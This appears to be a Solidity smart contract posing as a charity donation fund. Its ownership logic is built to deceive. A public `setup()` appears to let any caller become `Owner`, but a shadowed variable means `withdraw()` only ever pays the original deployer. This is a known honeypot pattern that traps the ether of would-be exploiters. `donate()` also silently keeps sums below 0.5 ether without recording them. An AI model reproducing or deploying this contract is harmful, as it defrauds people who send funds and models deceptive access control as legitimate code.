pragma solidity ^0.4.23;
// Charity fund for Dogra Foundation

contract FundOwner {
    address public Owner = msg.sender;
    function isOwner() returns (bool) {
        if (Owner == msg.sender) return true; return false;
    }
}

contract DograCharityFund is FundOwner {
    mapping (address => uint) public donations;
    uint public openDate;
    address public Owner;

function() public payable { }
    
    function setup() public {
        Owner = msg.sender;
        openDate = now;
    }
    
    function donate() public payable {
        if (msg.value >= 0.5 ether) {
            donations[msg.sender] += msg.value;
        }
    }

    function withdraw(uint amount) public {
        if (isOwner() && now >= openDate) {
            if (amount <= this.balance) {
                msg.sender.transfer(amount);
            }
        }
    }
}